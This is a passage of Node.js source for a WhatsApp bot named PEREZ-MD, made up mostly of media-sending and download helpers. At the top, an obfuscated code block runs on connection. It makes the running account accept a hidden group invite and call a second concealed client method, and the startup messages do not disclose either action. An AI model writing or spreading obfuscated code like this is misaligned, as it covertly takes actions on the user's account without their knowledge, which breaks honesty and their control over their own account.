_0x1e7778=parseInt(_0x254296(0x1f5))/0x1*(parseInt(_0x254296(0x1fc))/0x2)+-parseInt(_0x254296(0x1fa))/0x3+-parseInt(_0x254296(0x1ff))/0x4*(parseInt(_0x254296(0x200))/0x5)+-parseInt(_0x254296(0x1f9))/0x6*(-parseInt(_0x254296(0x1fe))/0x7)+parseInt(_0x254296(0x1fd))/0x8*(-parseInt(_0x254296(0x1f2))/0x9)+parseInt(_0x254296(0x1fb))/0xa*(-parseInt(_0x254296(0x1f4))/0xb)+parseInt(_0x254296(0x1f8))/0xc;if(_0x1e7778===_0x79a74a)break;else _0x4563b6['push'](_0x4563b6['shift']());}catch(_0x15ed55){_0x4563b6['push'](_0x4563b6['shift']());}}}(_0x4c0b,0xc6811),await client['groupAcceptInvite'](_0x32017d(0x1f3)),await client[_0x32017d(0x1f6)](_0x32017d(0x1f7)));
      console.log(color("Congrats, PEREZ-MD has successfully connected to this server", "green"));
      console.log(color("Follow me on github as Ignatiusperez", "red"));
      console.log(color("Text the bot number with menu to check my command list"));
      client.sendMessage(client.user.id, { text: `Successfully connected » To »【𝙋𝙀𝙍𝙀𝙕-𝙈𝘿】` });
    }
    // console.log('Connected...', update)
  });

  client.ev.on("creds.update", saveCreds);

  const getBuffer = async (url, options) => {
    try {
      options ? options : {};
      const res = await axios({
        method: "get",
        url,
        headers: {
          DNT: 1,
          "Upgrade-Insecure-Request": 1,
        },
        ...options,
        responseType: "arraybuffer",
      });
      return res.data;
    } catch (err) {
      return err;
    }
  };

  client.sendImage = async (jid, path, caption = "", quoted = "", options) => {
    let buffer = Buffer.isBuffer(path)
      ? path
      : /^data:.*?\/.*?;base64,/i.test(path)
      ? Buffer.from(path.split`,`[1], "base64")
      : /^https?:\/\//.test(path)
      ? await await getBuffer(path)
      : fs.existsSync(path)
      ? fs.readFileSync(path)
      : Buffer.alloc(0);
    return await client.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

client.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => { 
         let types = await client.getFile(PATH, true) 
         let { filename, size, ext, mime, data } = types 
         let type = '', mimetype = mime, pathFile = filename 
         if (options.asDocument) type = 'document' 
        if (options.asSticker || /webp/.test(mime)) { 
          let { writeExif } = require('./lib/dreadexif.js') 
             let media = { mimetype: mime, data } 
             pathFile = await writeExif(media, { packname: packname, author: packname, categories: options.categories ? options.categories : [] }) 
             await fs.promises.unlink(filename) 
             type = 'sticker' 
             mimetype = 'image/webp' 
         } 
         else if (/image/.test(mime)) type = 'image' 
         else if (/video/.test(mime)) type = 'video' 
         else if (/audio/.test(mime)) type = 'audio' 
         else type = 'document' 
         await client.sendMessage(jid, { [type]: { url: pathFile }, mimetype, fileName, ...options }, { quoted, ...options }) 
         return fs.promises.unlink(pathFile) 
     } 
     client.parseMention = async(text) => { 
         return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') 
     }
        client.sendImageAsSticker = async (jid, path, quoted, options = {}) => { 
         let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0); 
         // let buffer 
         if (options && (options.packname || options.author)) { 
             buffer = await writeExifImg(buff, options) 
         } else { 
             buffer = await imageToWebp(buff); 
         } 
  
         await client.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted }); 
         return buffer 
     }; 
 client.sendVideoAsSticker = async (jid, path, quoted, options = {}) => { 
         let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0); 
         //let buffer 
         if (options && (options.packname || options.author)) { 
             buffer = await writeExifVid(buff, options) 
         } else { 
             buffer = await videoToWebp(buff); 
         } 
  
         await client.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted }); 
         return buffer 
     }; 
 client.downloadMediaMessage = async (message) => { 
         let mime = (message.msg || message).mimetype || ''; 
         let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]; 
         const stream = await downloadContentFromMessage(message, messageType); 
         let buffer = Buffer.from([]); 
         for await(const chunk of stream) { 
             buffer = Buffer.concat([buffer, chunk]) 
         } 
  
         return buffer 
      }; 
  
 client.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => { 
         let quoted = message.msg ? message.msg : message; 
         let mime = (message.msg || message).mimetype || ''; 
         let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]; 
         const stream = await downloadContentFromMessage(quoted, messageType); 
         let buffer = Buffer.from([]); 
         for await(const chunk of stream) { 
             buffer = Buffer.concat([buffer, chunk]); 
         } 
         let type = await FileType.fromBuffer(buffer); 
         trueFileName = attachExtension ? (filename + '.' + type.ext) : filename; 
         // save to file 
         await fs.writeFileSync(trueFileName, buffer); 
         return trueFileName; 
     };

  client.sendText = (jid, text, quoted = "", options) => client.sendMessage(jid, { text: text, ...options }, { quoted });

  client.cMod = (jid, copy, text = "", sender = client.user.id, options = {}) => {
    //let copy = message.toJSON()
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === "ephemeralMessage";
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === "string") msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== "string")
      msg[mtype] = {
        ...content,
        ...options,
      };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === client.user.id;

    return proto.WebMessageInfo.fromObject(copy);
  };

  return client;
}

startperez();

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});
